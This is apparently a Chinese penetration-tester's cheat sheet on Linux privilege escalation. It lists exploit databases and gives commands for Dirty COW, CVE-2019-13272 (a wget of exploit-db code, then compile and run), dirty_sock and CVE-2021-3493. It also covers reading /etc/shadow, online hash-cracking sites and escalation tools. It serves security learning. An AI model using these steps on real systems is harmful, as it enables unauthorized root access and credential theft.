#### 一、漏洞收集

- 常用信息站点

> http://www.exploit-db.com
https://www.securityfocus.com/bid
https://www.rapid7.com/db/
https://cxsecurity.com/exploit/
https://seclists.org/fulldisclosure/
https://exploit.kitploit.com/
https://www.cvedetails.com/index.php
https://packetstormsecurity.com/
http://cve.mitre.org/cve/search_cve_list.html
https://www.anquanke.com/vul
https://nvd.nist.gov/vuln/categories

- searchsploit命令

> https://gitlab.com/exploit-database/exploitdb

```sh
searchsploit smb windows remote
```

#### 二、历史漏洞利用

##### 0x01、脏牛(Dirty COW)

> POC：https://github.com/FireFart/dirtycow
> 
> GCC编译：gcc -pthread ditry.c -o dirty -lcrypt
> 
> 替换root用户： ./dirty password

##### 0x02、CVE-2019-13272

Linux本地提权

漏洞范围：`4.10 < linux内核版本 < 5.1.17`

> exploitdb： https://www.exploit-db.com/exploits/47163

```sh
wget https://www.exploit-db.com/download/47163 -O exp.c 
gcc exp.c –o exp 
./exp
```

##### 0x03、CVE-2019-7304

Linux包管理器**snap**本地提权漏洞

Ubuntu版本范围： 

> Ubuntu 18.10 
> 
> Ubuntu 18.04 LTS 
> 
> Ubuntu 16.04 LTS 
> 
> Ubuntu 14.04 LTS

snap版本范围：`2.28 < snapd < 2.37`

> https://github.com/initstring/dirty_sock

##### 0x04、CVE-2021-3493

漏洞影响范围：

> Ubuntu 20.10 
> 
> Ubuntu 20.04 LTS 
> 
> Ubuntu 18.04 LTS 
> 
> Ubuntu 16.04 LTS 
> 
> Ubuntu 14.04 ESM

利用脚本：https://github.com/briskets/CVE-2021-3493

```sh
gcc exploit.c -o exploit

./exploit
```

#### 三、密码哈希

```sh
cat /etc/shadow

#1. 用户名 
#2. 加密后的密码 
#3. 上次修改密码的时间(从1970.1.1开始的总天数) 
#4. 两次修改密码间隔的最少天数，如果为0，则没有限制 
#5. 两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制提 
#6. 前多少天警告用户密码将过期 
#7. 在密码过期之后多少天禁用此用户 
#8. 用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用 
#9. 保留
```

##### 0x01、哈希撞库

> https://cmd5.com/
> 
> https://www.somd5.com/

##### 0x02、提权工具

- traitor

```sh
https://github.com/liamg/traitor
```

- gtfo

```sh
https://github.com/mzfr/gtfo
```
